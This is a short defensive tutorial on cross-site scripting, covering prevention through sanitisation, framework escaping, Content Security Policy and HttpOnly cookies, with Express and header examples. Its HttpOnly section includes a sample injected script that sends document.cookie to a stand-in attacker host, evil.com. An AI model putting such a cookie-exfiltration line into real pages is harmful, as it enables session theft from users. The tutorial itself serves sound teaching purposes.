ğŸ”¹ What is XSS (Cross-Site Scripting)?

XSS is a type of security vulnerability found in web applications that allows attackers to inject malicious JavaScript code into web pages viewed by other users.

When the browser runs that page, it also runs the attackerâ€™s script, which can do harmful things like:

Steal cookies or session tokens (to impersonate the user)

Deface the website

Redirect users to malicious sites

Log keystrokes or steal data



ğŸ”¹ How to Prevent XSS

âœ… 1. Escape or sanitize user input
Use libraries like:

DOMPurify in JavaScript

escape() utilities in backend frameworks

âœ… 2. Use framework protections
React, Angular, and Vue automatically escape content in JSX/templates:

<p>{userComment}</p> // safe in React


But using dangerouslySetInnerHTML is risky.

âœ… 3. Use Content Security Policy (CSP)
CSP can block inline scripts and only allow scripts from trusted sources.

âœ… 4. Donâ€™t trust user input
Always validate and sanitize before rendering or storing it.

âœ… 5. Use HttpOnly cookies
Prevents JavaScript from reading cookies (reduces cookie theft risk).



ğŸª What is an HttpOnly Cookie?

An HttpOnly cookie is a special type of browser cookie that cannot be accessed by JavaScript.

It can only be sent between the browser and the server during HTTP(S) requests.

That means:

You can store sensitive information like authentication tokens in it.

Attackers canâ€™t steal it using XSS (because document.cookie canâ€™t read it).

ğŸ” Why it helps against XSS

If an attacker injects malicious JavaScript on your site:

// Attacker's injected script
console.log(document.cookie);
fetch("https://evil.com?cookie=" + document.cookie);


Normally, this would send all cookies (including session tokens) to the attackerâ€™s server.

But if your cookies are marked as HttpOnly, then:

document.cookie // âŒ will not show the HttpOnly cookie


ğŸ‘‰ So even though the attackerâ€™s script executes, it cannot steal session data.

âš™ï¸ How to Set HttpOnly Cookies
âœ… Example in Express (Node.js)
res.cookie("token", jwtToken, {
  httpOnly: true,   // prevents JavaScript access
  secure: true,     // only over HTTPS
  sameSite: "strict" // helps prevent CSRF
});

âœ… Example in a response header
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
